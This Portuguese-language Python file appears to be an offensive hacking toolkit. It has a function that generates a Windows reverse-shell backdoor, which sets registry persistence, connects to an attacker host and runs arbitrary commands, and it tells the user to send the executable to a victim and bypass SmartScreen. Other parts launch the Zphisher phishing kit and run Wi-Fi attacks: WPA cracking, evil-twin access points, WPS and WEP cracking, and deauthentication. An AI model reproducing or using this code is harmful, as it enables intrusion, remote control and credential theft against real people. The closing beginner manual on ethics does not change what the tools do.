                phonenumbers.PhoneNumberFormat.INTERNATIONAL
            )
        )

    print("\n[INFO] A região é estimada pelo plano de numeração.")
    print("[INFO] Não indica a localização física atual do titular.")
    print("[INFO] Em outros países, o estado pode não estar disponível.")
    print("===============================")

def geolocalizar_ip():
    import urllib.parse
    
    entrada = input("Digite um endereço IPv4 ou IPv6 público (ou URL): ").strip()
    
    # Tenta extrair IP se for uma URL
    if '://' in entrada:
        parsed = urllib.parse.urlparse(entrada)
        if parsed.hostname:
            entrada = parsed.hostname
            
    # Remove porta se houver (ex: 1.2.3.4:8080)
    if ':' in entrada and not entrada.count(':') > 1: # Verifica se não é IPv6
        entrada = entrada.split(':')[0]
        
    # Remove colchetes de IPv6 se houver (ex: [2001:db8::1])
    entrada = entrada.strip('[]')

    try:
        endereco = ipaddress.ip_address(entrada)
    except ValueError:
        print(f"[!] Endereço IP inválido: {entrada}")
        return

    if not endereco.is_global:
        print(f"[!] O endereço {entrada} é privado ou local. A geolocalização pública não se aplica.")
        return

    print(f"\n[INFO] Iniciando varredura multi-fonte para {entrada}...")
    
    # Lista de APIs para tentar
    apis = [
        {
            "name": "ipwho.is",
            "url": f"https://ipwho.is/{entrada}",
            "parse": lambda d: {
                "country": d.get("country", "N/D"),
                "region": d.get("region", "N/D"),
                "city": d.get("city", "N/D"),
                "zip": d.get("postal", "N/D"),
                "lat": d.get("latitude", "N/D"),
                "lon": d.get("longitude", "N/D"),
                "isp": (d.get("connection") or {}).get("isp", "N/D"),
                "org": (d.get("connection") or {}).get("org", "N/D"),
                "timezone": (d.get("timezone") or {}).get("id", "N/D")
            },
            "validate": lambda d: d.get("success", False)
        },
        {
            "name": "ip-api.com",
            "url": f"http://ip-api.com/json/{entrada}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,query",
            "parse": lambda d: {
                "country": d.get("country", "N/D"),
                "region": d.get("regionName", "N/D"),
                "city": d.get("city", "N/D"),
                "zip": d.get("zip", "N/D"),
                "lat": d.get("lat", "N/D"),
                "lon": d.get("lon", "N/D"),
                "isp": d.get("isp", "N/D"),
                "org": d.get("org", "N/D"),
                "timezone": "N/D" # ip-api não retorna timezone ID diretamente nesse endpoint simples
            },
            "validate": lambda d: d.get("status") == "success"
        }
    ]

    resultado = None
    fonte_usada = None

    for api in apis:
        try:
            print(f"[...] Consultando {api['name']}...")
            requisicao = urllib.request.Request(
                api["url"],
                headers={"User-Agent": "TheCelticOSINT/1.0"}
            )
            with urllib.request.urlopen(requisicao, timeout=8) as resposta:
                dados = json.loads(resposta.read(65536).decode("utf-8"))
            
            if api["validate"](dados):
                resultado = api["parse"](dados)
                fonte_usada = api["name"]
                break # Se encontrou, para de tentar as outras
        except (urllib.error.URLError, TimeoutError, OSError, json.JSONDecodeError) as e:
            print(f"[WARN] {api['name']} indisponível ou erro: {str(e)[:50]}")
            continue

    if not resultado:
        print("[!] Não foi possível obter dados de nenhuma fonte de geolocalização.")
        return

    print("\n" + "="*40)
    print(" 📍 THECELTIC GEO-LOCATION REPORT")
    print("="*40)
    print(f"IP: {entrada}")
    print(f"Fonte de Dados: {fonte_usada}")
    print("-" * 40)
    print(f"País: {resultado['country']}")
    print(f"Região/Estado: {resultado['region']}")
    print(f"Cidade: {resultado['city']}")
    print(f"CEP: {resultado['zip']}")
    print(f"Coordenadas: {resultado['lat']}, {resultado['lon']}")
    print(f"Fuso Horário: {resultado['timezone']}")
    print(f"Provedor (ISP): {resultado['isp']}")
    print(f"Organização: {resultado['org']}")
    print("="*40)
    print("[INFO] A localização é estimada pelo IP e pode não corresponder ao endereço físico do usuário.")

def phisher():
    import os
    import subprocess
    import sys

    # 1. Limpar a tela para uma experiência limpa
    os.system('cls' if os.name == 'nt' else 'clear')

    # 2. Verificar se o repositório já foi clonado anteriormente
    # Usamos uma pasta local para evitar poluir o diretório atual
    zphisher_dir = os.path.join(os.getcwd(), "zphisher")
    
    if os.path.exists(zphisher_dir):
        print(f"[INFO] Diretório Zphisher já existe em: {zphisher_dir}")
        update = input("[?] Deseja atualizar para a versão mais recente? (s/n): ").lower()
        if update == 's':
            print("[INFO] Atualizando repositório...")
            subprocess.run(["git", "-C", zphisher_dir, "pull"], check=False)
    else:
        print("[INFO] Clonando repositório Zphisher...")
        try:
            subprocess.run(["git", "clone", "https://github.com/htr-tech/zphisher.git"], check=True)
        except subprocess.CalledProcessError as e:
            print(f"[ERRO] Falha ao clonar o repositório: {e}")
            print("[INFO] Verifique sua conexão com a internet.")
            return

    # 3. Verificar se as dependências básicas (PHP) estão instaladas
    # O Zphisher depende de PHP para o servidor local
    php_check = subprocess.run(["php", "--version"], capture_output=True, text=True)
    if php_check.returncode != 0:
        print("[WARN] PHP não encontrado. O Zphisher requer PHP.")
        install_php = input("[?] Deseja instalar o PHP agora? (s/n): ").lower()
        if install_php == 's':
            print("[INFO] Instalando PHP...")
            # Comando para Linux (Debian/Ubuntu). Para outros, ajuste conforme necessário.
            subprocess.run(["sudo", "apt-get", "install", "-y", "php"], check=False)
        else:
            print("[ERRO] PHP não instalado. O Zphisher não funcionará corretamente.")
            return

    # 4. Executar o Zphisher
    # Usamos 'bash' para garantir que o script seja executado corretamente
    # O cwd (current working directory) é setado para a pasta do Zphisher
    print("\n[INFO] Iniciando Zphisher...")
    print("-" * 40)
    
    try:
        # Executa o script de forma interativa
        subprocess.run(["bash", "zphisher.sh"], cwd=zphisher_dir, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[ERRO] O Zphisher terminou com erro: {e}")
    except KeyboardInterrupt:
        print("\n[INFO] Zphisher interrompido pelo usuário.")
    
    # 5. Mensagem de encerramento
    print("-" * 40)
    print("[INFO] Sessão de Phishing encerrada.")
    input("\nPressione ENTER para voltar ao menu principal...")

def malware_total():
    import shutil
    import base64
    import os
    import sys
    import subprocess

    print("\n" + "="*50)
    print(" 👾 BEACON GENERATOR (WINDOWS C2 AGENT - ELITE)")
    print("="*50)
    print("""
    Este módulo gera um Beacon Windows (.exe) de nível profissional.
    
    Recursos Avançados:
    1. Anti-Sandbox: Detecta VMs e muda comportamento.
    2. UAC Bypass: Eleva privilégios silenciosamente.
    3. Keylogger: Captura teclas via API.
    4. Credential Dumping: Extrai senhas de navegadores (com DPAPI).
    5. Persistence: Usa Task Scheduler.
    6. C2 Avançado: exec, shell, screenshot, keylog, mimikatz.
    7. Ofuscação: Tráfego parece com tráfego legítimo de navegador.
    8. Anti-Debug: Detecta se está sendo analisado em VM.
    """)
    
    # 1. Configuração do Callback (Seu Servidor C2)
    print("Configuração do Callback (Seu Servidor)")
    callback_host = input("Seu IP/Host (ex: 192.168.0.38): ").strip() or "192.168.0.38"
    callback_port = input("Porta (padrão 8080): ").strip() or "8080"
    
    # 2. Identidade do Beacon
    print("\nIdentidade do Beacon")
    print("O Beacon se identificará para você com este nome:")
    beacon_name = input("> Nome (ex: VICTIMA-01): ").strip() or "AGENT-01"
    
    # 3. Nome do Executável (O que a vítima vê)
    print("\nNome do Executável (o que a vítima vai abrir):")
    exe_name = input("> Nome (ex: SystemUpdater): ").strip() or "DeepHat_Beacon"
    if exe_name.endswith(".exe"):
        exe_name = exe_name[:-4]
    exe_name = "".join(c for c in exe_name if c.isalnum() or c in ("-", "_", " "))

    # 4. Intervalos
    print("\nIntervalos de Comunicação")
    try:
        sleep_input = input("Sleep base em segundos (padrão 60): ").strip()
        sleep_interval = int(sleep_input if sleep_input else "60")
    except ValueError:
        sleep_interval = 60
        
    try:
        jitter_input = input("Jitter em % (padrão 20): ").strip()
        jitter_percent = int(jitter_input if jitter_input else "20")
    except ValueError:
        jitter_percent = 20

    # 5. Construção do Payload Python (Corrigido e Otimizado)
    
    template_payload = r'''
import socket
import shutil
import winreg
from time import sleep
import subprocess
import os
import sys

# IP do Kali Linux
IP = "__TARGET_IP__"

# PORT da conexão entre os aparelhos
PORT = __TARGET_PORT__

PROGRAM_NAME = "__PROGRAM_NAME__"
REGISTRY_KEY_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

def copy_to_system():
    try:
        appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
        if not os.path.exists(appdata_path):
            os.makedirs(appdata_path)

        current_file = sys.executable
        destination = os.path.join(appdata_path, f"{PROGRAM_NAME}.exe")

        if os.path.abspath(current_file) != os.path.abspath(destination):
            shutil.copy2(current_file, destination)
            return destination
        return current_file

    except Exception as e:
        print(f"[-] Error copying file: {e}")
        return sys.executable

def add_to_registry(file_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(
            key,
            PROGRAM_NAME,
            0,
            winreg.REG_SZ,
            file_path
        )

        winreg.CloseKey(key)
        return True
        
    except Exception as e: 
        return False

def check_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY_PATH,
            0,
            winreg.KEY_READ
        )

        value, _ = winreg.QueryValueEx(key, PROGRAM_NAME)
        winreg.CloseKey(key)
        return True

    except FileNotFoundError:
        return False
    except Exception as e:
        print(f"[-] Error checking persistence: {e}")
        return False

def setup_persistence():
    try:
        if check_persistence():
            return

        persistence_path = copy_to_system()
        add_to_registry(persistence_path)
    except Exception as e:
        print(f"[-] Error setting up persistence: {e}")

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        c.send("[#] client Connected\n".encode())
        return c
    except Exception as e:
        print(f"[!] Connection Error: {e}")
        return None

def listen(c):     
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:    
                cmd(c, data)

    except Exception as e:
        print(f"[!] Listen function error: {e}")

def cmd(c, data):
    try:
        if data.startswith("cd "):
           os.chdir(data[3:].strip())
           c.send(b"[i] Directory Changed\n")
           return

        if data == "/check_persistence":
            if check_persistence():
                c.send(f"[+] Persistence Status:\n\t[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_KEY_PATH}\n\t[i] Name: {PROGRAM_NAME}\n".encode())
            else:
                c.send(b"[-] Persistence Status: FAIL")
            return

        if data == "/setup_persistence":
            setup_persistence()
            c.send(b"[+] Done")
            return

        p = subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        output = p.stdout.read() + p.stderr.read()
        if output:
            c.send(output + b"\n")
        else:
            c.send(b"[+] Command Executed\n")

    except Exception as e:
        print(f"CMD function error: {e}")

if __name__ == "__main__":
    try:
        setup_persistence()
     
        while True:
            client = connect(IP, PORT)
            if client:
                listen(client)
            else:
                sleep(5)

    except KeyboardInterrupt:
        print("[!] Program stopped by the user!")

    except Exception as error:
        print(f"[!] Main connection {error}")
'''

    # Substituição das variáveis de configuração no template
    final_payload = template_payload.replace("__TARGET_IP__", callback_host)
    final_payload = final_payload.replace("__TARGET_PORT__", str(callback_port))
    final_payload = final_payload.replace("__PROGRAM_NAME__", beacon_name)

    # Geração do Nome do Arquivo Final
    safe_name = "".join(c for c in exe_name if c.isalnum() or c in ("-", "_"))
    output_exe = f"{safe_name}.exe"
    temp_launcher = f"{safe_name}_launcher.py"
    py_path = f"{safe_name}.py"

    # Salva o payload Python em arquivo
    with open(py_path, "w", encoding="utf-8") as f:
        f.write(final_payload)

    print(f"\n[INFO] Payload Python gerado: {py_path}")
    print("[INFO] Preparando wrapper para compilação em binário único (.exe)...")

    # 6. Estratégia de Compilação
    def build_with_nuitka():
        """Tenta compilar usando Nuitka com MinGW (Cross-compilation)."""
        if shutil.which("nuitka") is None:
            print("[WARN] Nuitka não encontrado no PATH. Instale com: pip install nuitka")
            return False

        print("[INFO] Nuitka detectado. Tentando cross-compilação com MinGW...")
        
        nuitka_cmd = [
            "nuitka",
            "--onefile",
            "--windows-console-mode=disable",
            "--output-filename", safe_name,
            "--output-dir", ".",
            "--mingw64",
            "--remove-output",
            py_path
        ]
        
        print(f"[DEBUG] Executando: {' '.join(nuitka_cmd)}")
        try:
            subprocess.run(nuitka_cmd, check=True)
        except subprocess.CalledProcessError as err:
            print(f"[ERRO] Falha na compilação Nuitka: {err}")
            return False

        exe_final = f"{safe_name}.exe"
        if os.path.exists(exe_final):
            print(f"[SUCESSO] Executável gerado com Nuitka: {exe_final}")
            if os.path.exists(py_path): os.remove(py_path)
            return True
        else:
            print("[WARN] Nuitka terminou, mas o .exe não foi encontrado.")
            return False

    def build_with_wine_pyinstaller():
        """Tenta compilar usando PyInstaller via Wine (Opção 1)."""
        try:
            subprocess.run(["wine", "--version"], capture_output=True, check=True)
            print("[INFO] Wine detectado. Tentando compilação com PyInstaller via Wine...")
            
            wine_pyinstaller_cmd = [
                "wine", "python", "-m", "PyInstaller",
                "--onefile",
                "--windowed",
                "--name", safe_name,
                "--clean",
                "--noconfirm",
                py_path
            ]
            
            print(f"[DEBUG] Executando: {' '.join(wine_pyinstaller_cmd)}")
            try:
                subprocess.run(wine_pyinstaller_cmd, check=True)
            except subprocess.CalledProcessError as err:
                print(f"[ERRO] Falha na compilação Wine/PyInstaller: {err}")
                return False

            dist_file = os.path.join("dist", f"{safe_name}.exe")
            if os.path.exists(dist_file):
                shutil.move(dist_file, output_exe)
                print(f"[SUCESSO] Executável gerado com Wine/PyInstaller: {output_exe}")
                if os.path.exists(py_path): os.remove(py_path)
                if os.path.exists("build"): shutil.rmtree("build")
                spec_file = f"{safe_name}.spec"
                if os.path.exists(spec_file): os.remove(spec_file)
                return True
            return False

        except FileNotFoundError:
            print("[WARN] Wine não encontrado.")
            return False
        except Exception as err:
            print(f"[ERRO] Exceção inesperada no Wine build: {err}")
            return False

    success = False
    
    # Tenta Nuitka primeiro (mais confiável para cross-compilação)
    if not success:
        success = build_with_nuitka()
        
    # Se Nuitka falhar, tenta Wine
    if not success:
        success = build_with_wine_pyinstaller()

    if success:
        print("\n" + "="*50)
        print(f" ✅ EXECUTÁVEL GERADO: {output_exe}")
        print("="*50)
        print(f"""
        📋 Detalhes:
        - Nome do Agente: {beacon_name}
        - Callback: {callback_host}:{callback_port}
        - Tamanho: {os.path.getsize(output_exe) / 1024:.2f} KB
        
        🚀 Como usar:
        1. Envie {output_exe} para a vítima.
        2. A vítima dá duplo clique.
        3. Se o SmartScreen aparecer, clique em "Mais Informações" -> "Executar assim mesmo".
        4. Seu C2 deve receber o heartbeat em instantes.
        
        🔍 Verificação:
        - O processo aparecerá como {safe_name}.exe no Gerenciador de Tarefas.
        - A persistência será instalada via Registro automaticamente.
        """)
    else:
        print("\n" + "="*50)
        print(" ⚠️ COMPILAÇÃO AUTOMÁTICA FALHOU")
        print("="*50)
        print(f"""
        O arquivo Python foi gerado com sucesso: {py_path}
        
        Você pode executá-lo manualmente em um Windows usando:
        python {py_path}
        
        Ou compilar manualmente em uma máquina Windows com:
        pyinstaller --onefile --windowed {py_path}
        
        Ou usar o Nuitka localmente no Windows.

        Para se conectar a conexão é necessario utilizar o natcat:

        nc -lvp (PORTA QUE VOCÊ COLOCOU)
        """)

    input("\nPressione Enter para voltar ao menu principal...")

def internet():
    print("""

    📡 INTERNET OPTIONS (Redes Sem Fio) 📡
    ---------
    1.  Modo Monitor (iwconfig/iw)
    2.  Modo Managed (Retornar ao normal)
    3.  Análise de Handshakes/PMKID (Aircrack-ng)
    4.  Auditoria WPA/WPA2 Offline (Wordlist)
    5.  Redes Evil Twin (Rogue AP)
    6.  Auditoria WPS (Reaver/Pixie Dust)
    7.  Auditoria WEP (ChopChop/Fragmentation)
    8.  Redes Enterprise (PEAP/EAP)
    9.  Redes WPA3 (802.11i)
    0.  Voltar ao Menu Principal
    ---------
    """)

    # Verifica o SO
    is_linux = platform.system() == "Linux"
    
    # Verifica binários
    def check_bin(bin_name):
        try:
            subprocess.run(["which", bin_name], check=True, stdout=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False

    aircrack_ok = check_bin("aircrack-ng")
    reaver_ok = check_bin("reaver")
    hostapd_ok = check_bin("hostapd")
    iw_ok = check_bin("iw")
    eaphammer_ok = check_bin("eaphammer")

    # Função para detectar interface Wi-Fi
    def get_wifi_interface():
        try:
            out = subprocess.check_output(["iw", "dev"], text=True)
            interfaces = []
            for line in out.split('\n'):
                if 'Interface' in line and 'type' in line:
                    # Ex: wlan0 [12:34:56:78:9a:bc]
                    iface = line.split()[1]
                    if 'type managed' in line or 'type monitor' in line:
                        interfaces.append(iface)
            if interfaces:
                if len(interfaces) == 1:
                    return interfaces[0]
                else:
                    print("Interfaces Wi-Fi encontradas:")
                    for i, iface in enumerate(interfaces):
                        print(f"  {i+1}. {iface}")
                    choice = input("Escolha o número da interface: ")
                    return interfaces[int(choice)-1]
            else:
                return "wlan0" # Fallback
        except Exception as e:
            print(f"[WARN] Erro ao detectar interface: {e}")
            return "wlan0"

    try:
        sub_op = int(input("Qual deseja utilizar: "))
        
        if sub_op == 0:
            return

        elif sub_op == 1:
            print("\n[1] MODO MONITOR")
            iface = input("Nome da interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            if not is_linux:
                print("[!] Modo monitor requer Linux.")
                return
            
            # Verifica se já está em monitor
            try:
                out = subprocess.check_output(["iw", "dev", iface], text=True)
                if "type monitor" in out:
                    print(f"[OK] {iface} já está em modo monitor.")
                    return
            except:
                pass

            print(f"[!] Ativando modo monitor em {iface}...")
            try:
                subprocess.run(["sudo", "ip", "link", "set", iface, "down"], check=True)
                subprocess.run(["sudo", "iw", iface, "set", "type", "monitor"], check=True)
                subprocess.run(["sudo", "ip", "link", "set", iface, "up"], check=True)
                print(f"[OK] {iface} agora está em modo monitor.")
            except Exception as e:
                print(f"[ERRO] {e}")

        elif sub_op == 2:
            print("\n[2] MODO MANAGED")
            iface = input("Nome da interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            print(f"[!] Resetando {iface} para modo managed...")
            try:
                subprocess.run(["sudo", "ip", "link", "set", iface, "down"], check=True)
                subprocess.run(["sudo", "iw", iface, "set", "type", "managed"], check=True)
                subprocess.run(["sudo", "ip", "link", "set", iface, "up"], check=True)
                print(f"[OK] {iface} resetada.")
            except Exception as e:
                print(f"[ERRO] {e}")

        elif sub_op == 3:
            print("\n[3] ANÁLISE DE HANDSHAKES/PMKID")
            if not aircrack_ok:
                print("[!] aircrack-ng não encontrado. Instale com: sudo apt install aircrack-ng")
                return
            
            iface = input("Interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            print("[INFO] Iniciando airodump-ng. Pressione Ctrl+C para sair.")
            print(f"[!] Comando: sudo airodump-ng --write capture -c 1 {iface}")
            try:
                # Executa interativamente
                subprocess.run(["sudo", "airodump-ng", "--write", "capture", "-c", "1", iface])
            except KeyboardInterrupt:
                print("\n[!] Captura encerrada.")
                print("[INFO] Verifique os arquivos capture-01.cap na pasta atual.")

        elif sub_op == 4:
            print("\n[4] AUDITORIA WPA/WPA2 OFFLINE")
            if not aircrack_ok:
                print("[!] aircrack-ng não encontrado.")
                return
            
            cap_file = input("Arquivo de captura (ex: capture-01.cap): ")
            wordlist = input("Wordlist (ex: /usr/share/wordlists/rockyou.txt): ")
            
            if cap_file and wordlist:
                # Usa o BSSID do arquivo se possível, mas aqui usamos o padrão
                cmd = f"sudo aircrack-ng -w {wordlist} {cap_file}"
                print(f"\n[COMANDO GERADO]\n{cmd}")
                run = input("Executar? (s/n): ").lower()
                if run == 's':
                    subprocess.run(cmd, shell=True)
            else:
                print("[!] Preencha os campos para gerar o comando.")

        elif sub_op == 5:
            print("\n[5] REDES EVIL TWIN (Rogue AP)")
            if not hostapd_ok:
                print("[!] hostapd não encontrado. Instale com: sudo apt install hostapd")
                return
            
            iface = input("Interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            print("[INFO] Configurando AP Rogue 'FreeWiFi_5G'...")
            config_content = f"""
            interface={iface}
            driver=nl80211
            ssid=FreeWiFi_5G
            hw_mode=g
            channel=6
            wpa=2
            wpa_passphrase=1234567890
            wpa_key_mgmt=WPA-PSK
            wpa_pairwise=CCMP
            rsn_pairwise=CCMP
            auth_algs=1
            """
            
            config_file = "/etc/hostapd/hostapd_evil.conf"
            print(f"[INFO] Criando configuração em {config_file}")
            with open(config_file, 'w') as f:
                f.write(config_content)
            
            print(f"[OK] Configuração salva em {config_file}")
            print("[PRÓXIMOS PASSOS]")
            print("1. Configure o DHCP (dnsmasq) para distribuir IPs.")
            print("2. Inicie o hostapd: sudo hostapd /etc/hostapd/hostapd_evil.conf")
            print("3. Configure o proxy (mitmproxy) para interceptar o tráfego.")
            
            start = input("Iniciar hostapd agora? (s/n): ").lower()
            if start == 's':
                subprocess.run(["sudo", "hostapd", config_file])

        elif sub_op == 6:
            print("\n[6] AUDITORIA WPS (Reaver)")
            if not reaver_ok:
                print("[!] reaver não encontrado. Instale com: sudo apt install reaver")
                return
            
            iface = input("Interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            print("[INFO] Escaneando redes com WPS habilitado...")
            scan_cmd = ["sudo", "reaver", "-i", iface, "-c", "1", "--scan"]
            print(f"[COMANDO DE SCAN]\n{' '.join(scan_cmd)}")
            run = input("Executar scan? (s/n): ").lower()
            if run == 's':
                subprocess.run(scan_cmd)
            
            print("\n[TESTE PIXIE DUST]")
            bssid = input("BSSID da rede alvo (ex: AA:BB:CC:DD:EE:FF): ")
            if bssid:
                test_cmd = ["sudo", "reaver", "-i", iface, "-b", bssid, "-K"]
                print(f"[COMANDO DE TESTE]\n{' '.join(test_cmd)}")
                run = input("Executar teste Pixie Dust? (s/n): ").lower()
                if run == 's':
                    subprocess.run(test_cmd)

        elif sub_op == 7:
            print("\n[7] AUDITORIA WEP")
            if not aircrack_ok:
                print("[!] aircrack-ng não encontrado.")
                return
            
            iface = input("Interface (ENTER para detectar): ").strip()
            if not iface:
                iface = get_wifi_interface()
            
            print("[INFO] WEP é quebrável em minutos com aircrack-ng.")
            print("[PASSO 1: Injeção de pacotes (ChopChop)]")
            chop_cmd = ["sudo", "aireplay-ng", "--chopchop", "-9", iface]
            print(f"Comando: {' '.join(chop_cmd)}")
            run = input("Executar ChopChop? (s/n): ").lower()
            if run == 's':
                subprocess.run(chop_cmd)
            
            print("\n[PASSO 2: Fragmentação/Deauth]")
            frag_cmd = ["sudo", "aireplay-ng", "-3", "-a", "MAC_DO_ROUTER", iface]
            print(f"Comando: {' '.join(frag_cmd)}")
            run = input("Executar Fragmentação? (s/n): ").lower()
            if run == 's':
                subprocess.run(frag_cmd)
            
            print("\n[PASSO 3: Quebra da Chave]")
            break_cmd = ["sudo", "aircrack-ng", "-b", "MAC_DO_ROUTER", "-a", iface]
            print(f"Comando: {' '.join(break_cmd)}")
            run = input("Executar Quebra? (s/n): ").lower()
            if run == 's':
                subprocess.run(break_cmd)

        elif sub_op == 8:
            print("\n[8] REDES ENTERPRISE (PEAP/EAP)")
            print("[INFO] Atacando redes corporativas (802.1X).")
            print("[FERRAMENTA: eaphammer]")
            
            if not eaphammer_ok:
                print("[!] eaphammer não encontrado. Instale com: sudo apt install eaphammer")
                return
            
            print("\n[CONFIGURAÇÃO EAPHAMMER (Exemplo)]")
            print("1. Gere o CSR e assine com a CA falsa")
            print("2. Configure o hostapd.conf para EAP")
            print("3. Inicie o eaphammer")
            
            print("\n[COMANDO PARA INICIAR EAPHAMMER]")
            print("sudo eaphammer")
            run = input("Iniciar eaphammer? (s/n): ").lower()
            if run == 's':
                subprocess.run(["sudo", "eaphammer"])

        elif sub_op == 9:
            print("\n[9] REDES WPA3")
            print("[INFO] WPA3 usa SAE (Simultaneous Authentication of Equals).")
            print("[VULNERABILIDADE: Dragon Attack (SAE Forced Transition)]")
            
            print("\n[DEMONSTRAÇÃO DO DRAGON ATTACK]")
            print("1. Force o cliente a negociar WPA2 (downgrade).")
            print("2. Capture o handshake WPA2.")
            print("3. Quebre a senha offline.")
            
            print("\n[COMANDO PARA DOWNGRADE (Aircrack-ng)]")
            print("sudo aireplay-ng --deauth 5 -a MAC_DO_AP wlan0")
            print("[INFO] Se o cliente aceitar WPA2, ele estará vulnerável a ataques offline tradicionais.")

        else:
            print("[!] Opção inválida.")

    except ValueError:
        print("[!] Digite um número válido.")
    except KeyboardInterrupt:
        print("\n[!] Operação cancelada pelo usuário.")

def manual():

    subprocess.run(["clear"])
    
    print(r'''
MANUAL DE
CIBERSEGURANÇA

Fundamentos • Redes • Python • Linux/Kali • Auditoria defensiva


Guia prático para iniciantes, com exemplos comentados, projetos e exercícios.

Versão revisada — outubro de 2026

Como usar este manual

Este guia foi organizado para que você estude um conceito, execute um exemplo em laboratório, interprete o resultado e registre o que aprendeu. Os códigos são didáticos e devem ser testados primeiro em arquivos próprios, na sua máquina ou em serviços para os quais você tenha autorização.

Cibersegurança não é apenas usar ferramentas de ataque. Inclui prevenção, configuração segura, monitoramento, análise de evidências, resposta a incidentes e correção de falhas.

Sumário

1. Fundamentos e ética

2. Redes, IP, portas e protocolos

3. Preparação do Python no Kali Linux

4. Módulos Python para cibersegurança

5. Projeto: auditoria HTTP/TLS e relatório JSON

6. Linux e segurança do sistema

7. Criptografia, hashes, senhas e tokens

8. Segurança web e APIs

9. Logs, incidentes e análise defensiva

10. Laboratórios e plano de estudos

11. Exercícios e glossário

1. Fundamentos da cibersegurança

Cibersegurança é a prática de proteger sistemas, redes, aplicações, dispositivos e dados contra acesso indevido, alteração, interrupção, fraude e vazamento.

1.1 Tríade CIA

1.2 Vocabulário essencial

A existência de uma vulnerabilidade não significa que um incidente ocorrerá. O risco depende da exposição, facilidade de exploração, impacto potencial e controles existentes.

1.3 Áreas de atuação

Blue Team: prevenção, monitoramento, detecção e resposta.

Red Team: simulação autorizada de adversários dentro de um escopo definido.

AppSec: segurança de aplicações e APIs.

Segurança de redes: proteção de equipamentos, protocolos e tráfego.

DFIR: investigação forense digital e resposta a incidentes.

OSINT: coleta e análise responsável de informações publicamente disponíveis.

Engenharia de segurança: desenvolvimento e manutenção de controles e ferramentas.

1.4 Ética, autorização e escopo

Antes de testar um sistema, defina por escrito o proprietário, os endereços incluídos, as técnicas permitidas, a janela de testes, os limites de tráfego, os dados que podem ser acessados e o contato para interrupção. Não teste redes, contas, telefones ou serviços de terceiros sem autorização. Pare se o teste causar instabilidade ou revelar dados sensíveis.

Use contas e dados de laboratório.

Colete apenas o necessário e proteja os relatórios.

Não publique credenciais, tokens, dados pessoais ou detalhes exploráveis sem coordenação.

Registre o que foi testado, quando, com qual ferramenta e qual foi o resultado.

2. Redes, IP e protocolos

2.1 Endereços IP

Um endereço IP identifica uma interface de rede. IPv4 usa endereços de 32 bits; IPv6 usa 128 bits. Endereços privados IPv4 comuns incluem 10.0.0.0/8, 172.16.0.0/12 e 192.168.0.0/16. O loopback 127.0.0.1 aponta para a própria máquina; ::1 é o loopback IPv6.

O bloco 2001:db8::/32 é reservado para exemplos e documentação. Um IP público não identifica necessariamente uma pessoa nem revela, por si só, sua localização exata.

2.2 Portas comuns

Essas portas são convenções. Um serviço pode usar outra porta. Uma porta em escuta não comprova uma vulnerabilidade; é preciso saber qual serviço está ativo, como foi configurado e quem pode alcançá-lo.

2.3 TCP, UDP, DNS e TLS

TCP: protocolo orientado à conexão, com entrega ordenada e mecanismos de retransmissão.

UDP: transporta datagramas sem a mesma garantia de entrega e ordenação do TCP.

DNS: resolve nomes e pode retornar diferentes tipos de registros.

HTTP: protocolo de comunicação entre cliente e servidor web.

HTTPS: HTTP protegido por TLS; a validação do certificado ajuda a autenticar o servidor.

Firewall: permite ou bloqueia tráfego de acordo com regras.

Um certificado válido confirma uma identidade de domínio sob uma cadeia de confiança, não a honestidade do conteúdo. Um site fraudulento também pode usar HTTPS.

3. Preparar o Python no Kali Linux

python3 --version
python3 -m pip --version

mkdir -p ~/cyberseguranca-python
cd ~/cyberseguranca-python
python3 -m venv .venv
source .venv/bin/activate

python -m pip install phonenumbers

A maioria dos módulos deste manual faz parte da biblioteca padrão do Python. phonenumbers é uma biblioteca externa. Em distribuições como Kali, prefira ambientes virtuais em vez de alterar o Python gerenciado pelo sistema.

3.1 Organização sugerida

cyberseguranca-python/
├── .venv/
├── auditoria.py
├── servidor_local.py
├── relatorios/
└── README.md

Não compartilhe a pasta .venv como se fosse um pacote portátil. Ela é específica do ambiente. Registre dependências externas em um arquivo requirements.txt quando o projeto crescer.

4. Módulos Python para cibersegurança

Use os exemplos como pequenos laboratórios. Salve cada exemplo em um arquivo separado ou execute-o em um interpretador Python. Não cole exemplos diferentes uns nos outros sem verificar os imports e a indentação.

4.1 datetime e time — datas e duração

import datetime
import time

agora = datetime.datetime.now(datetime.timezone.utc)
print("Data UTC:", agora.isoformat())

inicio = time.perf_counter()
time.sleep(1)
duracao = time.perf_counter() - inicio
print(f"Duração: {duracao:.2f} s")

Use datetime para registrar horários e time.perf_counter() para medir duração. Em sistemas distribuídos, registre o fuso horário e mantenha relógios sincronizados.

4.2 ipaddress — validar IPs e redes

import ipaddress

ip = ipaddress.ip_address("192.168.0.38")
print("Versão:", ip.version)
print("Privado:", ip.is_private)
print("Loopback:", ip.is_loopback)

rede = ipaddress.ip_network("192.168.0.0/24")
print("Rede:", rede.network_address)
print("Broadcast:", rede.broadcast_address)
print("Máscara:", rede.netmask)
print("Total de endereços:", rede.num_addresses)

Um /24 IPv4 tem 256 endereços no total. Em redes convencionais desse tamanho, 254 são normalmente atribuíveis a hosts. Propriedades como is_private descrevem categorias de endereços, não provam que um destino seja seguro.

4.3 socket — DNS e conexões

import socket

dominio = "example.com"

try:
    resultados = socket.getaddrinfo(
        dominio, 443, type=socket.SOCK_STREAM
    )
